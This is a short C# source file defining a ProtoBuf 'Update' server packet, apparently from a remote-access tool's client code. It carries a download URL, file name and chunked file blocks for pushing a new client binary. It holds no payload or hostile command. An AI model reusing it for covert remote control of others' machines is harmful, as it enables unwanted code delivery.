using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Update : IPacket
    {
        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string DownloadURL { get; set; }

        [ProtoMember(3)]
        public string FileName { get; set; }

        [ProtoMember(4)]
        public byte[] Block { get; set; }

        [ProtoMember(5)]
        public int MaxBlocks { get; set; }

        [ProtoMember(6)]
        public int CurrentBlock { get; set; }

        public Update()
        {
        }

        public Update(int id, string downloadurl, string filename, byte[] block, int maxblocks, int currentblock)
        {
            this.ID = id;
            this.DownloadURL = downloadurl;
            this.FileName = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}